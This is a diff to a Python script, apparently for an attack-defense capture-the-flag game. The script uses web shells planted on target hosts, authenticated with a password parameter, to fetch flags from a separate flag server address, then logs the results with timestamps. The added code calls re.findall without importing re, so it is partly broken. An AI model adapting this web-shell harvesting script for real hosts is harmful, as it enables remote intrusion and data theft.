@@ -3,7 +3,7 @@
 # 需要修改的地方：
 # flag_url
 
-import sys,requests,base64
+import sys,requests,base64,time
 
 def loadfile(filepath):
 	try : 
@@ -20,7 +20,7 @@ def file_write(filepath,filecontent):
 
 def getflag(url,method,passwd,flag_path):
 	#flag机的url
-	flag_url="10.12.110.101"
+	flag_url="http://10.12.110.94/flag/get-flag"
 	#print url
 	#判断shell是否存在
 	#passwd = passwd.strip()
@@ -47,7 +47,8 @@ def getflag(url,method,passwd,flag_path):
 			res = requests.get(url,params=data,timeout=3)
 			#print res.url
 			if res.content:
-				content = url+"\n"+res.content+"\n"
+				flag = re.findall(r'(flag.*)', res.content)[0]
+				content = time.strftime('%Y.%m.%d-%H:%M:%S',time.localtime(time.time()))+"\n"+url+"\n"+flag+"\n\n"
 				#print content
 				file_write(flag_path,content)
 				print "[+] %s getflag sucessed!"%url
@@ -65,7 +66,8 @@ def getflag(url,method,passwd,flag_path):
 		try:
 			res = requests.post(url,data=data,timeout=3)
 			if res.content:
-				content = url+"\n"+res.content+"\n"
+				flag = re.findall(r'(flag.*)', res.content)[0]
+				content = time.strftime('%Y.%m.%d-%H:%M:%S',time.localtime(time.time()))+"\n"+url+"\n"+flag+"\n\n"
 				#print content
 				file_write(flag_path,content)
 				print "[+] %s getflag sucessed!"%url
